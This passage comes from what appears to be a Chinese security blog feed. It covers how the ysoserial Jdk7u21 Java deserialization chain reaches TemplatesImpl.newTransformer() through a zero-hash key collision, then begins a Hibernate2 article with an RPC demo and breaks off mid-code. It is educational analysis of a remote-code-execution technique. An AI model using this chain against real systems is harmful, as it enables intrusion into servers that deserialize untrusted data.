punctuation">(</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrivilegedAction</span><span class="token operator">&lt;</span>Method<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">public</span> Method<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Method<span class="token punctuation">[</span><span class="token punctuation">]</span> var1 <span class="token operator">=</span> AnnotationInvocationHandler<span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                AccessibleObject<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> var1<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>该方法会循环获取AnnotationInvocationHandler.type中的方法，我们可以看到type对象指向了一个Templates.class对象</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/5.png" alt="5"></p><p>Templates是一个接口，该接口中只有两个抽象方法</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/6.png" alt="6"></p><p>所以getMemberMethods()方法返回的结果就是两个Method对象，一个是newTransformer的Method对象，一个是getOutputProperties的Method对象,这样我们是如何通过反射调用的TemplatesImpl.newTransformer()方法的逻辑就清晰了</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/7.png" alt="7"></p><h3 id="2-2-如何构造满足条件的hash值"><a href="#2-2-如何构造满足条件的hash值" class="headerlink" title="2.2 如何构造满足条件的hash值"></a>2.2 如何构造满足条件的hash值</h3><p>但是有一个问题还没有解决，那就是刚才所讲的所有代码逻辑，都要在<code>key.equals(k)</code>可以执行的前提下才可以，那么究竟怎样才能执行<code>key.equals(k)</code>呢，我们来重新看一遍LinkedHashMap.put方法的部分实现</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">putForNullKey</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> null<span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Object k<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span></code></pre><p>可以看到 需要满足一些条件 才可以执行到<code>key.equals(k)</code>接下来就详细讲一讲如何才能满足以上这些条件，这是笔者个人觉得整个漏洞利用中最难也是最让人拍案叫绝的思路。</p><p>首先第一次调用<code>map.put()</code>时传入的参数e是我们封装了恶意代码的TemplatesImpl对象，另一个参数就是一个空的Object对象</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/8.png" alt="8"></p><p>由下图代码可知，我们需要计算出key 也就是恶意TemplatesImpl对象的hash值</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/9.png" alt="9"></p><p>深入看hash方法的实现</p><pre class=" language-java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span>Object k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>useAltHashing<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>Hashing<span class="token punctuation">.</span><span class="token function">stringHash32</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        h <span class="token operator">=</span> hashSeed<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    h <span class="token operator">^=</span> k<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// This function ensures that hashCodes that differ only by</span>    <span class="token comment" spellcheck="true">// constant multiples at each bit position have a bounded</span>    <span class="token comment" spellcheck="true">// number of collisions (approximately 8 at default load factor).</span>    h <span class="token operator">^=</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> h <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里调用TemplatesImpl.hashCode()方法来得出hash值然后进行固定的异或操作，得出的最终结果进行返回，下面的截图中就是此次运算得出的hash值</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/10.png" alt="10"></p><p>接下来通过indexFor()函数 得到其hash索引 这里返回的索引值是12，并将值符給变量i 这里传入的table.legth，table是一个Entry数组，用来存放我们通过map.put()传入的键值对，并作为后续判断新传入的键值对和旧键值对是否重复的依据</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Returns index for hash code h. */</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">indexFor</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> h <span class="token operator">&amp;</span> <span class="token punctuation">(</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/11.png" alt="11"></p><p>接着就开始了第一次判断，首先当前table变量指向的Entry对象是空的，所以自然e 为null 在这里就不符合了，所以循环体内的代码不会执行</p><pre class=" language-java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> null<span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next）</code></pre><p>跳过for循环体，然后计数器自增，并将此TemplatesImpl对象本身，还有其Hash值和索引放入到之前说到的table变量中。</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/12.png" alt="12"></p><p>接下来就开始第二次循环了，第二次传入的key就是触发TemplatesImpl.newTransformer()的媒介 Proxy对象了这个对象里有我们特意封装进去的AnnotationInvocationHandler对象。</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/13.png" alt="13"></p><p>接下来问题就来了首先for循环中要满足e不为空，这就要求这次循环并计算Proxy对象从而得出的Hash值和Hash索引必须和上一次循环中的TemplatesImpl对象相同，这样才能在<code>Entry&lt;K,V&gt; e = table[i]</code>这一步中，从table中取到对应索引的对象赋值給e，从而满足<code>e != null</code> 。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span>Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> null<span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span></code></pre><p>那怎么才能让两个连类型都不相同的对象通过运算却能得出一样的hash值呢？接下载关键点就来了，也就是我们为什么生成Proxy对像时要传入AnnotationInvocationHandler对象。</p><p>在计算Proxy对象的hash值的时候 我们看到最终是通过调用Proxy.hashCode()来计算hash值</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/14.png" alt="14"></p><p>Proxy是一个动态代理对象，所以经过对调用方法名称的判断，最终调用AnnotationInvocationHandler.hashCodeImpl()方法</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/15.png" alt="15"></p><p>以下是hashCodeImpl方法的实现,此时的var2是一个Iterator对象，用来遍历memberValues对象中存储的键值对</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">hashCodeImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> var1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    Entry var3<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>Iterator var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         var1 <span class="token operator">+=</span> <span class="token number">127</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>var3<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">memberValueHashCode</span><span class="token punctuation">(</span>var3<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        var3 <span class="token operator">=</span> <span class="token punctuation">(</span>Entry<span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> var1<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看到memberValues中只有一个键值对就是，就是我们在初期通过反射生成AnnotationInvocationHandler对象时传入的HashMap对象中的那个键值对 key是一个字符串”f5a5a608” Value值适合第一次循环时用来计算hash值的同一个TemplatesImpl对象</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/16.png" alt="16"></p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/17.png" alt="17"></p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/18.png" alt="18"></p><p>我们在看一看var3此时的值。</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/19.png" alt="19"></p><p>AnnotationInvocationHandler计算hash最关键的是这一段代码。简单来说就是127乘var3 key的hash值，然后和var3的value值的hash值进行异或操作</p><pre class=" language-java"><code class="language-java">var1 <span class="token operator">+=</span> <span class="token number">127</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>var3<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">memberValueHashCode</span><span class="token punctuation">(</span>var3<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>下面贴出memberValueHashCode方法的关键代码，返回var3的value值也就是TemplatesImpl对象的Hash值。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">memberValueHashCode</span><span class="token punctuation">(</span>Object var0<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Class <span class="token class-name">var1</span> <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> var0<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>至此所得到的结果都是和第一次循环时得到的Hash值相同，但接下来就要解决如果在经过与<code>127 * ((String)var3.getKey()).hashCode()</code>进行异或操作后，保持结果不变。</p><p>我们知道0和任何数字进行异或，得到的结果都是被异或数本身。所以我们要让<code>127 * ((String)var3.getKey()).hashCode()</code>的结果等于0 也就是(String)var3.getKey()).hashCode()的值要为零</p><p>还记得我们var3的 key是什么么？是一个字符串 值为”f5a5a608”  这个字符串非常有意思我们看一下这个字符串的hash值是多少</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/20.png" alt="20"></p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialjdk7u21/21.png" alt="21"></p><p>结果是0，完全符合我们的要求，这样127乘以0自然结果是0，0在同TemplatesImpl对象的hash值进行异或，得到的结果自然也是TemplatesImpl对象的hash值本身。这样就符合我们的要求。通过了LinkedHashMap.put方法中的for循环的判断，由于hash值相同，所以计算出的索引相同，e的值就为之前的TemplatesImpl对象，所以e不为null 结果为true</p><pre><code>for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) </code></pre><p>接下来好要通过if 判断中的前两个条件，因为&amp;&amp; 和|| 有短路效果，所以这三个条件我们要符合e.hash == hash为true    (k = e.key) == key为flase  </p><pre><code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code></pre><p>首先e.hash == hash是将第一次循环时的TemplatesImpl对象的hash取出同第二次循环时TemplatesImpl对象的hash进行对比，本来就都是同一个对象，所以自然时相同的，所以结果为true</p><p>(k = e.key) == key 将第一次循环时的key取出和第二次循环时的key做比对看是否相同，第一次循环的key是TemplatesImpl对象，而第二次循环时key时Proxy对象，所以结果为flase</p><p>如此这般，我们就通过了前两个判断条件，接下来自然就会执行key.equals(k)从而调用TemplatesImpl.newTransformer()方法并最终触发我们的恶意代码</p><p>至此jdk7u21漏洞原理分析完毕</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h2><p>此次Jdk7u21 payload中作用到的所有类，均存在于JDK自身的代码中，无需再调用任何第三方jar包，所以当时爆出漏洞时影响极大。只要目标系统中使用的jdk版本并存在反序列化数据交互点就会存在远程代码执行漏洞。漏洞的触发点在LinkedHashSet，其实我们看代码的时候可以看到LinkedHashSet里面的方法都是调用了其父类HashSet中的方法，但是之所以不直接用HashSet的原因是LinkedHashSet里数据的下标和我们插入时的顺序一样，而HashSet顺序就不一样了。通过Hash值的匹配，然后执行到key.equals(k)最终执行到TemplatesImpl.newTransformer()方法</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> ysoserial </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> Jdk7u21 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化系列ysoserialHibernate2</title>
      <link href="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/"/>
      <url>/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化系列-ysoserial-Hibernate2"><a href="#Java反序列化系列-ysoserial-Hibernate2" class="headerlink" title="Java反序列化系列 ysoserial Hibernate2"></a>Java反序列化系列 ysoserial Hibernate2</h1><h2 id="1-Hibernate简介"><a href="#1-Hibernate简介" class="headerlink" title="1.Hibernate简介"></a>1.Hibernate简介</h2><p>Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的ORM框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。 Hibernate可以应用在任何使用JDBC的场合，既可以在Java的客户端程序使用，也可以在Servlet/JSP的Web应用中使用，最具革命意义的是，Hibernate可以在应用EJB的JaveEE架构中取代CMP，完成数据持久化的重任。</p><h2 id="2-RPC简介"><a href="#2-RPC简介" class="headerlink" title="2.RPC简介"></a>2.RPC简介</h2><p>RPC(Remote Procedure Call)远程过程调用。允许一台计算机程序远程调用另外一台计算机的子程序，不用关心底层网络通信。</p><p>很多人对RPC的概念很模糊，其实RPC是建立在Socket的基础上的。通过Socket将对另一台计算机中的某个类的某个方法的请求同时包含该方法所需要传输的参数序列化传输过去，然后在另一台计算机接收后判断具体调用的哪个类的哪一个方法，然后通过反射调用该方法并传入参数，最终将方法的返回值序列化并通过Socket传输回发送方法调用请求的那台计算机上，这样的一个过程就是所谓的远程方法调用</p><p> 一次RPC调用的过程大概有10步：</p><p>　　1.执行客户端调用语句，传送参数</p><p>　　2.调用本地系统发送网络消息</p><p>　　3.消息传送到远程主机</p><p>　　4.服务器得到消息并取得参数 </p><p>　　5.根据调用请求以及参数执行远程过程（服务）</p><p>　　6.执行过程完毕，将结果返回服务器句柄</p><p>　　7.服务器句柄返回结果，调用远程主机的系统网络服务发送结果</p><p>　　8.消息传回本地主机 </p><p>　　9.客户端句柄由本地主机的网络服务接收消息</p><p>　　10.客户端接收到调用语句返回的结果数据</p><p>以下是一张截取自网上的RPC执行流程图</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/1.png" alt="1"></p><p>接下来通过java代码来实现一个最简化的RPC Demo</p><p>先看一下文件结构首先是client端也就是发起远程方法请求的一方</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/2.png" alt="2"></p><p>然后是server端也就是处理远程方法请求的一方</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/3.png" alt="3"></p><p>首先看RpcPrincipleTestInterface接口，此接口是公开的，也就是这个接口文件是client端和server端中都存在的，接下来是RpcPrincipleTestInterface的代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">RpcPrincipleTestInterface</span> <span class="token keyword">extends</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">myAdd</span><span class="token punctuation">(</span><span class="token keyword">int</span> firstNum<span class="token punctuation">,</span> <span class="token keyword">int</span> SecondNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">mySub</span><span class="token punctuation">(</span><span class="token keyword">int</span> firstNum<span class="token punctuation">,</span> <span class="token keyword">int</span> SecondNum<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">sayHello</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后我们观察client端的RpcPrincipleClientTestimpl.java</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RpcPrincipleClientTestimpl</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        RpcPrincipleTestInterface rpcPrincipleTestInterface <span class="token operator">=</span> <span class="token punctuation">(</span>RpcPrincipleTestInterface<span class="token punctuation">)</span>Stub<span class="token punctuation">.</span><span class="token function">getStub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> resultOne <span class="token operator">=</span> rpcPrincipleTestInterface<span class="token punctuation">.</span><span class="token function">myAdd</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>resultOne<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> resultTwo <span class="token operator">=</span> rpcPrincipleTestInterface<span class="token punctuation">.</span><span class="token function">mySub</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>resultTwo<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String resultThree <span class="token operator">=</span> rpcPrincipleTestInterface<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>resultThree<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>下面是执行结果</p><p><img src="/2020/06/01/java-fan-xu-lie-hua-xi-lie-ysoserialhibernate2/4.png" alt="4"></p><p>可以看到我们执行了RpcPrincipleTestInterface接口中的方法但是我们在本地并未有任何RpcPrincipleTestInterface接口的具体实现？那这些个执行结果究竟是谁给出的呢？</p><p>我们通过观察代码不难发现，为rpcPrincipleTestInterface变量赋值的是Stub.getStub()方法，该方法的返回值被我们强转成了RpcPrincipleTestInterface类型。那Stub.getStub()方法的返回值究竟是什么我们继续深入来看</p><p>下面是Stub.java的代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Stub</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getStub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        InvocationHandler h <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object proxy<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>                Socket socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String methodName <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>methodName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"myAdd"</span><span class="token punctuation">)</span><span class="token operator">||</span>methodName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"mySub"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    Class<span class="token punctuation">[</span><span class="token punctuation">]</span> parameterType <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ObjectOutputStream outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    outputStream<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>parameterType<span class="token punctuation">)</span><span class="token punctuation">;</span>                    outputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>                    outputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//outputStream.close();</span>                    DataInputStream inputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">int</span> result <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    inputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> result<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>methodName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"sayHello"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    Class<span class="token punctuation">[</span><span class="token punctuation">]</span> parameterType <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    ObjectOutputStream outputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    outputStream<span class="token punctuation">.</span><span class="token function">writeUTF</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    outputStream<span class="token punctuation">.</span><span 